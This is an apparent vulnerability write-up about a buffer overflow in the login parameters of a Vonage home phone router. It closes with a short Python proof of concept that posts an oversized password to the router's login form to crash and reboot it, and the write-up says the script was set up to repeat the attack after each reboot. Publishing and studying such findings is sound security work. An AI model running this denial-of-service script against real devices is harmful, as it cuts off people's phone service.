Overview
During an evaluation of the Vonage home phone router, it was identified that the loginUsername and loginPassword parameters were vulnerable to a buffer overflow. This overflow caused the router to crash and reboot. Further analysis will be performed to find out if the the crash is controllable and allow for full remote code execution.

Device Description:
1 port residential gateway

Hardware Version:
VDV-23: 115

Original Software Version:
3.2.11-0.9.40

Exploitation Writeup
This exploit was a simple buffer overflow. The use of spike fuzzer took place to identify the crash condition. When the application crashes, the router reboots causing a denial of service condition. The script below was further weaponized to sleep for a 60 second period while the device rebooted then continue one execution after another.

Proof of concept code:
The code below was used to exploit the application. This testing was only performed against denial of service conditions. The crash that was experienced potentially holds the ability to allow remote code execution. Further research will be performed against the device.

DOSTest.py

import requests 
passw = 'A' * 10580 post_data = {'loginUsername':'router', 'loginPassword':passw, 'x':'0', 'y':'0'} 
post_response = requests.post(url='http://192.168.15.1/goform/login', data=post_data)